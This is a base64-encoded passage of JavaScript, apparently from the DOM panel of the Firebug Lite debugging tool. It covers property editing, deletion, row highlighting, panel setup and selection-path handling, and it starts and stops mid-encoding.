FRNTCA9ICRTVFIoIndhcm5pbmcuQ29tbWFuZCBsaW5lIGJsb2NrZWQ/Iik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgcm93LmlubmVySFRNTCA9ICRTVFIoIndhcm5pbmcuQ29uc29sZSBtdXN0IGJlIGVuYWJsZWQiKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmIChoYXNDbGFzcyhyb3csICJ3YXRjaFJvdyIpKQ0KICAgICAgICAgICAgRmlyZWJ1Zy5FZGl0b3Iuc3RhcnRFZGl0aW5nKHJvdywgZ2V0Um93TmFtZShyb3cpKTsNCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgb2JqZWN0ID0gdGhpcy5nZXRSb3dPYmplY3Qocm93KTsNCiAgICAgICAgICAgIHRoaXMuY29udGV4dC50aGlzVmFsdWUgPSBvYmplY3Q7DQoNCiAgICAgICAgICAgIGlmICghZWRpdFZhbHVlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBwcm9wVmFsdWUgPSB0aGlzLmdldFJvd1Byb3BlcnR5VmFsdWUocm93KTsNCg0KICAgICAgICAgICAgICAgIHZhciB0eXBlID0gdHlwZW9mKHByb3BWYWx1ZSk7DQogICAgICAgICAgICAgICAgaWYgKHR5cGUgPT0gInVuZGVmaW5lZCIgfHwgdHlwZSA9PSAibnVtYmVyIiB8fCB0eXBlID09ICJib29sZWFuIikNCiAgICAgICAgICAgICAgICAgICAgZWRpdFZhbHVlID0gcHJvcFZhbHVlOw0KICAgICAgICAgICAgICAgIGVsc2UgaWYgKHR5cGUgPT0gInN0cmluZyIpDQogICAgICAgICAgICAgICAgICAgIGVkaXRWYWx1ZSA9ICJcIiIgKyBlc2NhcGVKUyhwcm9wVmFsdWUpICsgIlwiIjsNCiAgICAgICAgICAgICAgICBlbHNlIGlmIChwcm9wVmFsdWUgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICAgICAgZWRpdFZhbHVlID0gIm51bGwiOw0KICAgICAgICAgICAgICAgIGVsc2UgaWYgKG9iamVjdCBpbnN0YW5jZW9mIFdpbmRvdyB8fCBvYmplY3QgaW5zdGFuY2VvZiBqc2RJU3RhY2tGcmFtZSkNCiAgICAgICAgICAgICAgICAgICAgZWRpdFZhbHVlID0gZ2V0Um93TmFtZShyb3cpOw0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgZWRpdFZhbHVlID0gInRoaXMuIiArIGdldFJvd05hbWUocm93KTsNCiAgICAgICAgICAgIH0NCg0KDQogICAgICAgICAgICBGaXJlYnVnLkVkaXRvci5zdGFydEVkaXRpbmcocm93LCBlZGl0VmFsdWUpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGRlbGV0ZVByb3BlcnR5OiBmdW5jdGlvbihyb3cpDQogICAgew0KICAgICAgICBpZiAoaGFzQ2xhc3Mocm93LCAid2F0Y2hSb3ciKSkNCiAgICAgICAgICAgIHRoaXMuZGVsZXRlV2F0Y2gocm93KTsNCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgb2JqZWN0ID0gZ2V0Um93T3duZXJPYmplY3Qocm93KTsNCiAgICAgICAgICAgIGlmICghb2JqZWN0KQ0KICAgICAgICAgICAgICAgIG9iamVjdCA9IHRoaXMuc2VsZWN0aW9uOw0KICAgICAgICAgICAgb2JqZWN0ID0gdGhpcy5nZXRSZWFsT2JqZWN0KG9iamVjdCk7DQoNCiAgICAgICAgICAgIGlmIChvYmplY3QpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIG5hbWUgPSBnZXRSb3dOYW1lKHJvdyk7DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBkZWxldGUgb2JqZWN0W25hbWVdOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCAoZXhjKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIHRoaXMucmVidWlsZCh0cnVlKTsNCiAgICAgICAgICAgICAgICB0aGlzLm1hcmtDaGFuZ2UoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBzZXRQcm9wZXJ0eVZhbHVlOiBmdW5jdGlvbihyb3csIHZhbHVlKSAgLy8gdmFsdWUgbXVzdCBiZSBzdHJpbmcNCiAgICB7DQogICAgICAgIGlmKEZCVHJhY2UuREJHX0RPTSkNCiAgICAgICAgew0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoInJvdzogIityb3cpOw0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoInZhbHVlOiAiK3ZhbHVlKyIgdHlwZSAiK3R5cGVvZih2YWx1ZSksIHZhbHVlKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHZhciBuYW1lID0gZ2V0Um93TmFtZShyb3cpOw0KICAgICAgICBpZiAobmFtZSA9PSAidGhpcyIpDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgdmFyIG9iamVjdCA9IHRoaXMuZ2V0Um93T2JqZWN0KHJvdyk7DQogICAgICAgIG9iamVjdCA9IHRoaXMuZ2V0UmVhbE9iamVjdChvYmplY3QpOw0KICAgICAgICBpZiAob2JqZWN0ICYmICEob2JqZWN0IGluc3RhbmNlb2YganNkSVN0YWNrRnJhbWUpKQ0KICAgICAgICB7DQogICAgICAgICAgICAgLy8gdW53cmFwcGVkSlNPYmplY3QucHJvcGVydHkgPSB1bndyYXBwZWRKU09iamVjdA0KICAgICAgICAgICAgIEZpcmVidWcuQ29tbWFuZExpbmUuZXZhbHVhdGUodmFsdWUsIHRoaXMuY29udGV4dCwgb2JqZWN0LCB0aGlzLmNvbnRleHQuZ2V0R2xvYmFsU2NvcGUoKSwNCiAgICAgICAgICAgICAgICAgZnVuY3Rpb24gc3VjY2VzcyhyZXN1bHQsIGNvbnRleHQpDQogICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19ET00pDQogICAgICAgICAgICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoInNldFByb3BlcnR5VmFsdWUgZXZhbHVhdGUgc3VjY2VzcyBvYmplY3RbIituYW1lKyJdPSIrcmVzdWx0KyIgdHlwZSAiK3R5cGVvZihyZXN1bHQpLCByZXN1bHQpOw0KICAgICAgICAgICAgICAgICAgICAgb2JqZWN0W25hbWVdID0gcmVzdWx0Ow0KICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICBmdW5jdGlvbiBmYWlsZWQoZXhjLCBjb250ZXh0KQ0KICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRE9NKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoInNldFByb3BlcnR5VmFsdWUgZXZhbHVhdGUgZmFpbGVkIHdpdGggZXhjOiIrZXhjKyIgb2JqZWN0WyIrbmFtZSsiXT0iK3ZhbHVlKyIgdHlwZSAiK3R5cGVvZih2YWx1ZSksIGV4Yyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgLy8gSWYgdGhlIHZhbHVlIGRvZXNuJ3QgcGFyc2UsIHRoZW4ganVzdCBzdG9yZSBpdCBhcyBhIHN0cmluZy4gIFNvbWUgdXNlcnMgd2lsbA0KICAgICAgICAgICAgICAgICAgICAgICAgIC8vIG5vdCByZWFsaXplIHRoZXkncmUgc3VwcG9zZWQgdG8gZW50ZXIgYSBKYXZhU2NyaXB0IGV4cHJlc3Npb24gYW5kIGp1c3QgdHlwZQ0KICAgICAgICAgICAgICAgICAgICAgICAgIC8vIGxpdGVyYWwgdGV4dA0KICAgICAgICAgICAgICAgICAgICAgICAgIG9iamVjdFtuYW1lXSA9IFN0cmluZyh2YWx1ZSk7ICAvLyB1bndyYXBwZWRKU29iamVjdC5wcm9wZXJ0eSA9IHN0cmluZw0KICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggKGV4YykNCiAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmICh0aGlzLmNvbnRleHQuc3RvcHBlZCkNCiAgICAgICAgew0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgRmlyZWJ1Zy5Db21tYW5kTGluZS5ldmFsdWF0ZShuYW1lKyI9Iit2YWx1ZSwgdGhpcy5jb250ZXh0KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIChleGMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAvLyBTZWUgY2F0Y2ggYmxvY2sgYWJvdmUuLi4NCiAgICAgICAgICAgICAgICAgICAgb2JqZWN0W25hbWVdID0gU3RyaW5nKHZhbHVlKTsgLy8gdW53cmFwcGVkSlNvYmplY3QucHJvcGVydHkgPSBzdHJpbmcNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2ggKGV4YykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICB0aGlzLnJlYnVpbGQodHJ1ZSk7DQogICAgICAgIHRoaXMubWFya0NoYW5nZSgpOw0KICAgIH0sDQoNCiAgICBoaWdobGlnaHRSb3c6IGZ1bmN0aW9uKHJvdykNCiAgICB7DQogICAgICAgIGlmICh0aGlzLmhpZ2hsaWdodGVkUm93KQ0KICAgICAgICAgICAgY2FuY2VsQ2xhc3NUaW1lZCh0aGlzLmhpZ2hsaWdodGVkUm93LCAianVtcEhpZ2hsaWdodCIsIHRoaXMuY29udGV4dCk7DQoNCiAgICAgICAgdGhpcy5oaWdobGlnaHRlZFJvdyA9IHJvdzsNCg0KICAgICAgICBpZiAocm93KQ0KICAgICAgICAgICAgc2V0Q2xhc3NUaW1lZChyb3csICJqdW1wSGlnaGxpZ2h0IiwgdGhpcy5jb250ZXh0KTsNCiAgICB9LC8qKi8NCg0KICAgIG9uTW91c2VNb3ZlOiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIHZhciB0YXJnZXQgPSBldmVudC5zcmNFbGVtZW50IHx8IGV2ZW50LnRhcmdldDsNCiAgICAgICAgDQogICAgICAgIHZhciBvYmplY3QgPSBnZXRBbmNlc3RvckJ5Q2xhc3ModGFyZ2V0LCAib2JqZWN0TGluay1lbGVtZW50Iik7DQogICAgICAgIG9iamVjdCA9IG9iamVjdCA/IG9iamVjdC5yZXBPYmplY3QgOiBudWxsOw0KICAgICAgICANCiAgICAgICAgaWYob2JqZWN0ICYmIGluc3RhbmNlT2Yob2JqZWN0LCAiRWxlbWVudCIpICYmIG9iamVjdC5ub2RlVHlwZSA9PSAxKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZihvYmplY3QgIT0gbGFzdEhpZ2hsaWdodGVkT2JqZWN0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEZpcmVidWcuSW5zcGVjdG9yLmRyYXdCb3hNb2RlbChvYmplY3QpOw0KICAgICAgICAgICAgICAgIG9iamVjdCA9IGxhc3RIaWdobGlnaHRlZE9iamVjdDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgICAgICBGaXJlYnVnLkluc3BlY3Rvci5oaWRlQm94TW9kZWwoKTsNCiAgICAgICAgDQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBleHRlbmRzIFBhbmVsDQoNCiAgICBjcmVhdGU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIC8vIFRPRE86IHh4eHBlZHJvDQogICAgICAgIHRoaXMuY29udGV4dCA9IEZpcmVidWcuYnJvd3NlcjsNCiAgICAgICAgDQogICAgICAgIHRoaXMub2JqZWN0UGF0aCA9IFtdOw0KICAgICAgICB0aGlzLnByb3BlcnR5UGF0aCA9IFtdOw0KICAgICAgICB0aGlzLnZpZXdQYXRoID0gW107DQogICAgICAgIHRoaXMucGF0aEluZGV4ID0gLTE7DQogICAgICAgIHRoaXMudG9nZ2xlcyA9IHt9Ow0KDQogICAgICAgIEZpcmVidWcuUGFuZWwuY3JlYXRlLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7DQogICAgICAgIA0KICAgICAgICB0aGlzLnBhbmVsTm9kZS5zdHlsZS5wYWRkaW5nID0gIjAgMXB4IjsNCiAgICB9LA0KICAgIA0KICAgIGluaXRpYWxpemU6IGZ1bmN0aW9uKCl7DQogICAgICAgIEZpcmVidWcuUGFuZWwuaW5pdGlhbGl6ZS5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgICAgICANCiAgICAgICAgYWRkRXZlbnQodGhpcy5wYW5lbE5vZGUsICJtb3VzZW1vdmUiLCB0aGlzLm9uTW91c2VNb3ZlKTsNCiAgICB9LA0KICAgIA0KICAgIHNodXRkb3duOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICByZW1vdmVFdmVudCh0aGlzLnBhbmVsTm9kZSwgIm1vdXNlbW92ZSIsIHRoaXMub25Nb3VzZU1vdmUpOw0KICAgICAgICANCiAgICAgICAgRmlyZWJ1Zy5QYW5lbC5zaHV0ZG93bi5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgIH0sDQoNCiAgICAvKg0KICAgIGRlc3Ryb3k6IGZ1bmN0aW9uKHN0YXRlKQ0KICAgIHsNCiAgICAgICAgdmFyIHZpZXcgPSB0aGlzLnZpZXdQYXRoW3RoaXMucGF0aEluZGV4XTsNCiAgICAgICAgaWYgKHZpZXcgJiYgdGhpcy5wYW5lbE5vZGUuc2Nyb2xsVG9wKQ0KICAgICAgICAgICAgdmlldy5zY3JvbGxUb3AgPSB0aGlzLnBhbmVsTm9kZS5zY3JvbGxUb3A7DQoNCiAgICAgICAgaWYgKHRoaXMucGF0aEluZGV4KQ0KICAgICAgICAgICAgc3RhdGUucGF0aEluZGV4ID0gdGhpcy5wYXRoSW5kZXg7DQogICAgICAgIGlmICh0aGlzLnZpZXdQYXRoKQ0KICAgICAgICAgICAgc3RhdGUudmlld1BhdGggPSB0aGlzLnZpZXdQYXRoOw0KICAgICAgICBpZiAodGhpcy5wcm9wZXJ0eVBhdGgpDQogICAgICAgICAgICBzdGF0ZS5wcm9wZXJ0eVBhdGggPSB0aGlzLnByb3BlcnR5UGF0aDsNCg0KICAgICAgICBpZiAodGhpcy5wcm9wZXJ0eVBhdGgubGVuZ3RoID4gMCAmJiAhdGhpcy5wcm9wZXJ0eVBhdGhbMV0pDQogICAgICAgICAgICBzdGF0ZS5maXJzdFNlbGVjdGlvbiA9IHBlcnNpc3RPYmplY3QodGhpcy5nZXRQYXRoT2JqZWN0KDEpLCB0aGlzLmNvbnRleHQpOw0KDQogICAgICAgIEZpcmVidWcuUGFuZWwuZGVzdHJveS5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgIH0sDQogICAgLyoqLw0KICAgIA0KICAgIGlzaG93OiBmdW5jdGlvbihzdGF0ZSkNCiAgICB7DQogICAgICAgIGlmICh0aGlzLmNvbnRleHQubG9hZGVkICYmICF0aGlzLnNlbGVjdGlvbikNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKCFzdGF0ZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB0aGlzLnNlbGVjdChudWxsKTsNCiAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoc3RhdGUudmlld1BhdGgpDQogICAgICAgICAgICAgICAgdGhpcy52aWV3UGF0aCA9IHN0YXRlLnZpZXdQYXRoOw0KICAgICAgICAgICAgaWYgKHN0YXRlLnByb3BlcnR5UGF0aCkNCiAgICAgICAgICAgICAgICB0aGlzLnByb3BlcnR5UGF0aCA9IHN0YXRlLnByb3BlcnR5UGF0aDsNCg0KICAgICAgICAgICAgdmFyIGRlZmF1bHRPYmplY3QgPSB0aGlzLmdldERlZmF1bHRTZWxlY3Rpb24odGhpcy5jb250ZXh0KTsNCiAgICAgICAgICAgIHZhciBzZWxlY3RPYmplY3QgPSBkZWZhdWx0T2JqZWN0OyANCg0KICAgICAgICAgICAgaWYgKHN0YXRlLmZpcnN0U2VsZWN0aW9uKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciByZXN0b3JlZCA9IHN0YXRlLmZpcnN0U2VsZWN0aW9uKHRoaXMuY29udGV4dCk7DQogICAgICAgICAgICAgICAgaWYgKHJlc3RvcmVkKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgc2VsZWN0T2JqZWN0ID0gcmVzdG9yZWQ7DQogICAgICAgICAgICAgICAgICAgIHRoaXMub2JqZWN0UGF0aCA9IFtkZWZhdWx0T2JqZWN0LCByZXN0b3JlZF07DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgdGhpcy5vYmplY3RQYXRoID0gW2RlZmF1bHRPYmplY3RdOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHRoaXMub2JqZWN0UGF0aCA9IFtkZWZhdWx0T2JqZWN0XTsNCg0KICAgICAgICAgICAgaWYgKHRoaXMucHJvcGVydHlQYXRoLmxlbmd0aCA+IDEpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDE7IGkgPCB0aGlzLnByb3BlcnR5UGF0aC5sZW5ndGg7ICsraSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciBuYW1lID0gdGhpcy5wcm9wZXJ0eVBhdGhbaV07DQogICAgICAgICAgICAgICAgICAgIGlmICghbmFtZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KDQogICAgICAgICAgICAgICAgICAgIHZhciBvYmplY3QgPSBzZWxlY3RPYmplY3Q7DQogICAgICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBzZWxlY3RPYmplY3QgPSBvYmplY3RbbmFtZV07DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggKGV4YykNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgc2VsZWN0T2JqZWN0ID0gbnVsbDsNCiAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgIGlmIChzZWxlY3RPYmplY3QpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMub2JqZWN0UGF0aC5wdXNoKG5ldyBQcm9wZXJ0eShvYmplY3QsIG5hbWUpKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIElmIHdlIGNhbid0IGFjY2VzcyBhIHByb3BlcnR5LCBqdXN0IHN0b3ANCiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMudmlld1BhdGguc3BsaWNlKGkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5wcm9wZXJ0eVBhdGguc3BsaWNlKGkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5vYmplY3RQYXRoLnNwbGljZShpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGVjdE9iamVjdCA9IHRoaXMuZ2V0UGF0aE9iamVjdCh0aGlzLm9iamVjdFBhdGgubGVuZ3RoLTEpOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHZhciBzZWxlY3Rpb24gPSBzdGF0ZS5wYXRoSW5kZXggPD0gdGhpcy5vYmplY3RQYXRoLmxlbmd0aC0xDQogICAgICAgICAgICAgICAgPyB0aGlzLmdldFBhdGhPYmplY3Qoc3RhdGUucGF0aEluZGV4KQ0KICAgICAgICAgICAgICAgIDogdGhpcy5nZXRQYXRoT2JqZWN0KHRoaXMub2JqZWN0UGF0aC5sZW5ndGgtMSk7DQoNCiAgICAgICAgICAgIHRoaXMuc2VsZWN0KHNlbGVjdGlvbik7DQogICAgICAgIH0NCiAgICB9LA0KICAgIC8qDQogICAgaGlkZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIHZpZXcgPSB0aGlzLnZpZXdQYXRoW3RoaXMucGF0aEluZGV4XTsNCiAgICAgICAgaWYgKHZpZXcgJiYgdGhpcy5wYW5lbE5vZGUuc2Nyb2xsVG9wKQ0KICAgICAgICAgICAgdmlldy5zY3JvbGxUb3AgPSB0aGlzLnBhbmVsTm9kZS5zY3JvbGxUb3A7DQogICAgfSwNCiAgICAvKiovDQoNCiAgICBzdXBwb3J0c09iamVjdDogZnVuY3Rpb24ob2JqZWN0KQ0KICAgIHsNCiAgICAgICAgaWYgKG9iamVjdCA9PSBudWxsKQ0KICAgICAgICAgICAgcmV0dXJuIDEwMDA7DQoNCiAgICAgICAgaWYgKHR5cGVvZihvYmplY3QpID09ICJ1bmRlZmluZWQiKQ0KICAgICAgICAgICAgcmV0dXJuIDEwMDA7DQogICAgICAgIGVsc2UgaWYgKG9iamVjdCBpbnN0YW5jZW9mIFNvdXJjZUxpbmspDQogICAgICAgICAgICByZXR1cm4gMDsNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgcmV0dXJuIDE7IC8vIGp1c3QgYWdyZWUgdG8gc3VwcG9ydCBldmVyeXRoaW5nIGJ1dCBub3QgYWdyZXNzaXZlbHkuDQogICAgfSwNCg0KICAgIHJlZnJlc2g6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHRoaXMucmVidWlsZCh0cnVlKTsNCiAgICB9LA0KDQogICAgdXBkYXRlU2VsZWN0aW9uOiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgICAgICB2YXIgcHJldmlvdXNJbmRleCA9IHRoaXMucGF0aEluZGV4Ow0KICAgICAgICB2YXIgcHJldmlvdXNWaWV3ID0gcHJldmlvdXNJbmRleCA9PSAtMSA/IG51bGwgOiB0aGlzLnZpZXdQYXRoW3ByZXZpb3VzSW5kZXhdOw0KDQogICAgICAgIHZhciBuZXdQYXRoID0gdGhpcy5wYXRoVG9BcHBlbmQ7DQogICAgICAgIGRlbGV0ZSB0aGlzLnBhdGhUb0FwcGVuZDsNCg0KICAgICAgICB2YXIgcGF0aEluZGV4ID0gdGhpcy5maW5kUGF0aE9iamVjdChvYmplY3QpOw0KICAgICAgICBpZiAobmV3UGF0aCB8fCBwYXRoSW5kZXggPT0gLTEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRoaXMudG9nZ2xlcyA9IHt9Ow0KDQogICAgICAgICAgICBpZiAobmV3UGF0aCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyBSZW1vdmUgZXZlcnl0aGluZyBhZnRlciB0aGUgcG9pbnQgd2hlcmUgd2UgYXJlIGluc2VydGluZywgc28gd2UNCiAgICAgICAgICAgICAgICAvLyBlc3NlbnRpYWxseSByZXBsYWNlIGl0IHdpdGggdGhlIG5ldyBwYXRoDQogICAgICAgICAgICAgICAgaWYgKHByZXZpb3VzVmlldykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmICh0aGlzLnBhbmVsTm9kZS5zY3JvbGxUb3ApDQogICAgICAgICAgICAgICAgICAgICAgICBwcmV2aW91c1ZpZXcuc2Nyb2xsVG9wID0gdGhpcy5wYW5lbE5vZGUuc2Nyb2xsVG9wOw0KDQogICAgICAgICAgICAgICAgICAgIHZhciBzdGFydCA9IHByZXZpb3VzSW5kZXggKyAxLCANCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIE9wZXJhIG5lZWRzIHRoZSBsZW5ndGggYXJndW1lbnQgaW4gc3BsaWNlKCksIG90aGVyd2lzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gaXQgd2lsbCBjb25zaWRlciB0aGF0IG9ubHkgb25lIGVsZW1lbnQgc2hvdWxkIGJlIHJlbW92ZWQNCiAgICAgICAgICAgICAgICAgICAgICAgIGxlbmd0aCA9IHRoaXMub2JqZWN0UGF0aC5sZW5ndGggLSBzdGFydDsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHRoaXMub2JqZWN0UGF0aC5zcGxpY2Uoc3RhcnQsIGxlbmd0aCk7DQogICAgICAgICAgICAgICAgICAgIHRoaXMucHJvcGVydHlQYXRoLnNwbGljZShzdGFydCwgbGVuZ3RoKTsNCiAgICAgICAgICAgICAgICAgICAgdGhpcy52aWV3UGF0aC5zcGxpY2Uoc3RhcnQsIGxlbmd0aCk7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgdmFyIHZhbHVlID0gdGhpcy5nZXRQYXRoT2JqZWN0KHByZXZpb3VzSW5kZXgpOw0KICAgICAgICAgICAgICAgIGlmICghdmFsdWUpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImRvbS51cGRhdGVTZWxlY3Rpb24gbm8gcGF0aE9iamVjdCBmb3IgIitwcmV2aW91c0luZGV4KyJcbiIpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDAsIGxlbmd0aCA9IG5ld1BhdGgubGVuZ3RoOyBpIDwgbGVuZ3RoOyArK2kpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB2YXIgbmFtZSA9IG5ld1BhdGhbaV07DQogICAgICAgICAgICAgICAgICAgIHZhciBvYmplY3QgPSB2YWx1ZTsNCiAgICAgICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlID0gdmFsdWVbbmFtZV07DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgY2F0Y2goZXhjKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiZG9tLnVwZGF0ZVNlbGVjdGlvbiBGQUlMUyBhdCBwYXRoX2k9IitpKyIgZm9yIG5hbWU6IituYW1lKyJcbiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgKyt0aGlzLnBhdGhJbmRleDsNCiAgICAgICAgICAgICAgICAgICAgdGhpcy5vYmplY3RQYXRoLnB1c2gobmV3IFByb3BlcnR5KG9iamVjdCwgbmFtZSkpOw0KICAgICAgICAgICAgICAgICAgICB0aGlzLnByb3BlcnR5UGF0aC5wdXNoKG5hbWUpOw0KICAgICAgICAgICAgICAgICAgICB0aGlzLnZpZXdQYXRoLnB1c2goe3RvZ2dsZXM6IHRoaXMudG9nZ2xlcywgc2Nyb2xsVG9wOiAwfSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHRoaXMudG9nZ2xlcyA9IHt9Ow0KDQogICAgICAgICAgICAgICAgdmFyIHdpbiA9IEZpcmVidWcuYnJvd3Nlci53aW5kb3c7DQogICAgICAgICAgICAgICAgLy92YXIgd2luID0gdGhpcy5jb250ZXh0LmdldEdsb2JhbFNjb3BlKCk7DQogICAgICAgICAgICAgICAgaWYgKG9iamVjdCA9PT0gd2luKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGhpcy5wYXRoSW5kZXggPSAwOw0KICAgICAgICAgICAgICAgICAgICB0aGlzLm9iamVjdFBhdGggPSBbd2luXTsNCiAgICAgICAgICAgICAgICAgICAgdGhpcy5wcm9wZXJ0eVBhdGggPSBbbnVsbF07DQogICAgICAgICAgICAgICAgICAgIHRoaXMudmlld1BhdGggPSBbe3R